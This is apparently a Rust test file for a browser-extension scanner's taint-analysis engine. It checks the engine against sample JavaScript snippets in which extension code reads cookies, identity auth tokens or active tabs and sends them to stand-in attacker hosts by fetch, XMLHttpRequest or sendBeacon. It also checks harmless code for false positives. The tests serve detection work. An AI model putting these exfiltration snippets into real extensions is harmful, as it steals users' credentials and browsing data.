use crx_gate::ast::analyze_js_content;
use crx_gate::taint::{NetworkSinkKind, SensitiveSourceKind, TaintGraphEngine};

#[test]
fn test_multi_hop_variable_propagation() {
    let code = r#"
        const stolenCookies = chrome.cookies.getAll({ domain: "example.com" });
        const step1 = stolenCookies;
        const step2 = step1;
        const finalPayload = step2;
        fetch("https://attacker-domain.com/collect", {
            method: "POST",
            body: finalPayload
        });
    "#;

    let ast_report = analyze_js_content("background.js", code);
    assert_eq!(ast_report.taint_sources.len(), 1);
    assert_eq!(ast_report.taint_sinks.len(), 1);
    assert_eq!(ast_report.assignments.len(), 3);

    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert_eq!(leaks.len(), 1, "Must find exactly one multi-hop leak path");
    let leak = &leaks[0];
    assert_eq!(leak.source_kind, SensitiveSourceKind::Cookies);
    assert_eq!(leak.sink_kind, NetworkSinkKind::Fetch);
    assert_eq!(leak.sink_target_url.as_deref(), Some("https://attacker-domain.com/collect"));
    assert!(leak.flow_trace.len() >= 4, "Flow trace should show all propagation hops");
}

#[test]
fn test_send_beacon_sink_propagation() {
    let code = r#"
        const authData = chrome.identity.getAuthToken({ interactive: false });
        const serialized = JSON.stringify(authData);
        navigator.sendBeacon("https://telemetry-sink.com/beacon", serialized);
    "#;

    let ast_report = analyze_js_content("content.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert_eq!(leaks.len(), 1);
    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::AuthIdentityTokens);
    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::SendBeacon);
    assert_eq!(leaks[0].sink_target_url.as_deref(), Some("https://telemetry-sink.com/beacon"));
}

#[test]
fn test_document_cookie_to_xmlhttprequest() {
    let code = r#"
        const sessionCookie = document.cookie;
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "https://leak-server.com/endpoint");
        xhr.send(sessionCookie);
    "#;

    let ast_report = analyze_js_content("inject.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert_eq!(leaks.len(), 1);
    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::Cookies);
    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::XmlHttpRequest);
}

#[test]
fn test_clean_storage_usage_no_false_positive_leak() {
    let code = r#"
        const userPrefs = await chrome.storage.local.get(["theme", "fontSize"]);
        document.body.style.fontSize = userPrefs.fontSize;
        console.log("Applied theme:", userPrefs.theme);
        // Independent harmless fetch with hardcoded payload
        fetch("https://api.github.com/zen");
    "#;

    let ast_report = analyze_js_content("options.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert!(
        leaks.is_empty(),
        "Reading storage and setting DOM style must NOT produce a data exfiltration leak finding"
    );
}

#[test]
fn test_untainted_fetch_does_not_trigger_leak() {
    let code = r#"
        const staticConfig = { version: "1.0.0", debug: false };
        const body = JSON.stringify(staticConfig);
        fetch("https://api.example.com/status", {
            method: "POST",
            body: body
        });
    "#;

    let ast_report = analyze_js_content("background.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert!(
        leaks.is_empty(),
        "Sending non-sensitive static config must NOT trigger a taint leak"
    );
}

#[test]
fn test_identity_token_leak_propagation() {
    let code = r#"
        const authToken = await chrome.identity.getAuthToken({ interactive: false });
        const encoded = btoa(authToken);
        fetch("https://attacker-collect.com/harvest", {
            method: "POST",
            body: encoded
        });
    "#;

    let ast_report = analyze_js_content("auth.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert_eq!(leaks.len(), 1);
    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::AuthIdentityTokens);
    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::Fetch);
    assert_eq!(leaks[0].sink_target_url.as_deref(), Some("https://attacker-collect.com/harvest"));
}

#[test]
fn test_tab_query_leak_propagation() {
    let code = r#"
        const activeTabs = await chrome.tabs.query({ active: true });
        const serialized = JSON.stringify(activeTabs);
        navigator.sendBeacon("https://telemetry-exfil.com/tabs", serialized);
    "#;

    let ast_report = analyze_js_content("tracker.js", code);
    let mut engine = TaintGraphEngine::new();
    engine.populate_from_reports(&[ast_report]);
    let leaks = engine.find_leak_paths();

    assert_eq!(leaks.len(), 1);
    assert_eq!(leaks[0].source_kind, SensitiveSourceKind::TabBrowsingHistory);
    assert_eq!(leaks[0].sink_kind, NetworkSinkKind::SendBeacon);
    assert_eq!(leaks[0].sink_target_url.as_deref(), Some("https://telemetry-exfil.com/tabs"));
}
